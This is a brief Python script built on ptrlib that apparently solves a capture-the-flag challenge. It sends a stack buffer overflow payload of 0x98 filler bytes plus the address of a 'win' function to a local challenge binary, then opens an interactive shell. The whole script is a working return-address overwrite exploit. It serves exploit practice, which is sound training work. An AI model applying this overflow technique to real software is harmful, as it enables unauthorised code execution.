from ptrlib import *

elf = ELF("../distfiles/chall")
sock = Process("../distfiles/chall")

sock.sendlineafter(": ", "0")
payload  = b"A"*0x98
payload += p64(elf.symbol("win"))
sock.sendlineafter(": ", payload)

sock.sh()
